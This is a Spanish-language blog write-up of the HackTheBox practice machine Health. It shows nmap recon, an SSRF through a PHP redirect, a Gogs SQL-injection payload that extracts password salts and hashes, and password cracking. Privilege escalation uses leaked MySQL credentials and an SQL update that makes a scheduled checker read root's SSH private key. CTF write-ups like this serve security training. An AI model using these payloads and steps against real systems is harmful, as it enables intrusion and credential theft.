---
layout: post
title: "Write Up Health. "
subtitle: "Starting-Point"
category: Blog
tags: [Medium,Chunin,Linux,HTB,SQLi,Hashes,Cracking,CronJob,PHP,SSRF,CVE,Web,Vulnerability-Assessment,Database,Injection,Source-Code-Analysis,Outdated-Software,MySQL,Laravel,Gogs,SQLite,PHP,Exploit-Modification,Password-Reuse,Password-Cracking,Scheduled-Job-Abuse,Arbitrary-File-Read,Clear-Text-Credentials,SSRF,Information-Disclosure,eWPT,eWPTxv2,OSWE,OSCP] 
image:
  path: /assets/img/health/Captura%20de%20pantalla%20(187).png
---

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance


### nmap


```bash
nmap -p- --open --min-rate 5000 -n -vvv -Pn 10.10.11.176 -oA allports -Pn
```


![list](/assets/img/health/AWESOMW-2023-01-12-10-59-52.png){:.lead width="800" height="100" loading="lazy"}


### Services and Versions


```bash
nmap -p22,80 -sV -sC 10.10.11.176 -oN target
```
![list](/assets/img/health/AWESOMW-2023-01-12-11-02-27.png){:.lead width="800" height="100" loading="lazy"}


***

## Vulnerability Analysis


### HTTP TCP-80


Uso de Investigacion web, Google Hacking,Google Dorks y recopilación de información gracias a servicios de terceros e ispeccionamos la web enumerando las tecnologias de la ip ataves de la terminal o via  web esto lo hacemos con wapalizzer o whatweb.


Whatweb identificar tecnologuias atraves del terminal o wappalizer atraves de la web.


![list](/assets/img/health/AWESOMW-2023-01-12-11-02-55.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Logramos encontrar el dominio health.htb que agregaremos al `/etc/hosts`. 



Inspecionamos la web y tiene montado un servicio que te permite monitorear si un servicio esta activo o no, por lo que en el primer campo ponemos un host-payload con unpuerto cualquiera , en el segundo nuestra host y como intervalo 5 absteriscos.


![list](/assets/img/health/AWESOMW-2023-01-12-11-21-37.png){:.lead width="800" height="100" loading="lazy"}


En este punto lo que podemos hacer es algunas pruebas como crearnos un index.html con hola adentro y montarnos un servidor web con python para probar que pasa.


![list](/assets/img/health/AWESOMW-2023-01-12-11-24-03.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Nos ponemos ala escucha por los dos cpuetos con netcat en el 80 y el 6464, al 80 hace una peticion html pero para el 6464 hace una peticion de data.


![list](/assets/img/health/AWESOMW-2023-01-12-12-02-17.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Nos devuelve un output en json con el hola que pusimo en el `index.html`.


Con esto podemos tratar de explotar un SSRF pero antes vamos a provar si la maquina victima tiene puertos internos abiertos que antes con nmap no pudimos ver, pero no logramos nada.


{:.note}
Levantamos nuestro servidor en el puwerto 80 asi como nuertro netcat en el puerto 4646.


Con esto conseguimos la web que contiene el puerto 3000 y vemos que es una utilidad llamada gogs y la buscamos en internet o searchsploit y vemos que hay un exploit que nos vamos a decargar para usarlo.


Por otra parte vamos ahcer lo mismo pero en cambio com un index.php que nos imprima  el header del puerto 3000 de la victima de la siguiente forma.


```bash
<?php
    header("Location: http://health.htb:3000");
?>
```

{:.note}
Esto es para burlar los filtros y en el puerto 4646 nod debuelve un json con el contenido del localhost por el pueto 3000  que vamos a meter en un archivo llmadao dat.


![list](/assets/img/health/AWESOMW-2023-01-12-12-49-38.png){:.lead width="800" height="100" loading="lazy"}


Pero si nos montamos ub servidor hhtp con `python3 http.server 80` y podemos ver si lo abrimos que tecnologia esta en el pueto 3000 de lamaquina victima solo que en nuestra maquina.


![list](/assets/img/health/AWESOMW-2023-01-12-12-52-16.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Buscamos la vulnerabilidad gogs con searchsploit.


Ya en este punto abrimos el burpsuite he interceptamos la peticion enla ruta que no dijo la vulneravilidad gogs, en resumen lo que estamo haciendo es una query de injeccion de SQL solamente que esta modificada para que los espacios por `url encode` no lo le gusta pero otra forma es `/**/` y aparte tambien agrgar `||':'||` para cada separacion. 


![list](/assets/img/health/AWESOMW-2023-01-12-13-28-44.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Usamos el burpsuite y en vez de de usar la ruta `/proces` usamos la ruta `/users`.


```burp
')/**/union/**/all/**/select/**/1,2,(select/**/salt/**/from/**/user),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
```


{:.note}
Debemos esta con netcat a la escucha en el puerto `nc -lnvp 4646` para que nos devuelva el output y com `python3 http.server 80` carge el index.php con la injeccion SQL un hash que deberemos desencriptar.


Con el hash lo guadamos en unarchivo llamado data2 porque debemos reacomodarlo porque esta en hexadecimal y nosotros lo nesesitamos en base64 por lo que debemos aplicarle un tratamiento.


![list](/assets/img/health/AWESOMW-2023-01-12-13-41-13.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
El tratamiento seria `echo "<hash>" | xxd -ps -r` es nos dara una cadena que no es legible y a esa le hacemos  `echo "<cadena no legible>" | base64 -p`.


{:.note title="Attention"}
La injeccion SQL tambien nbos da el salt que es un  fragemto del hash qu esta separado por dos punto tambien  le aplicamos `echo -n "<salt>" | base64 -p` le metemos el menos n porque sino no se representaria bien el decode porque tomaria en cuenta el salto de linea tambien, cambiamos el root por sha.265:agregamos el 1000 + salt + el hash esto sera el nuevo hash.



![list](/assets/img/health/AWESOMW-2023-01-12-16-16-51.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Lo crackeamos con john y nos da la contraseña `february15` que usaremos para conectarnos por SSH.



```bash
ssh susanne@10.10.11.176
```


![list](/assets/img/health/AWESOMW-2023-01-12-16-18-20.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
La flag del usuario  de bajos privileguios esta en el escritorio del usuario `susanne`.


***

## Explotion


Siempre es bueno ejecutar `LimEnum` Y `pspy` para monitorizar y ver los posibles vectores para escalar de privilegios, ademas hasta que se ejecute los anteriores podemos buscar los permisos con el comado find con el siguite comando.


![list](/assets/img/health/AWESOMW-2023-01-12-16-30-34.png){:.lead width="800" height="100" loading="lazy"}


Despues de husmear un buen rato y meterme en algunos directorios di con un HealthChecker.php  y definimos un nuevo webhook apuntando a el primero en puerto 4646 y el  el otro con python en el puerto 80 como hemos venido haciendo todo el rato y le damos a crear.
Nos conectamos a mysql y deberemos de se rrapido para injectarle en una columna ya sea el permiso SUID o nos enrtablamos una resese shell.


```bash
mysql -Dlaravel -ularavel -pMYsql_strongestpass@2014+
```


{:.note}
De antes en un archivo de configuración en /var/www/html podemos encontrar credenciales de mysql.


```bash
update tasks set monitoredUrl='file:///root/.ssh/id_rsa';
```


{:.note}
Al darle forma cambiando \n por salto de linea y quitando \ nos queda la id_rsa de root.


![list](/assets/img/health/AWESOMW-2023-01-12-17-00-39.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Le damos permisos  600 y nos conectamos con SSH A root.


![list](/assets/img/health/AWESOMW-2023-01-12-17-02-06.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Ya lo ultimo es buscar la flag de superusuario en el escritorio de root.


***

```shell
🎉 Felicitaciones ya has comprometido Health de HackTheBox 🎉
```
{:.centered}
***

Back to [Certification eWPT](){:.heading.flip-title}
{:.read-more}

***
Back to [Certification eWPTv2](){:.heading.flip-title}
{:.read-more}

***
Back to [Certification OSWE](){:.heading.flip-title}
{:.read-more}

***
Back to [Certification OSCP](){:.heading.flip-title}
{:.read-more}

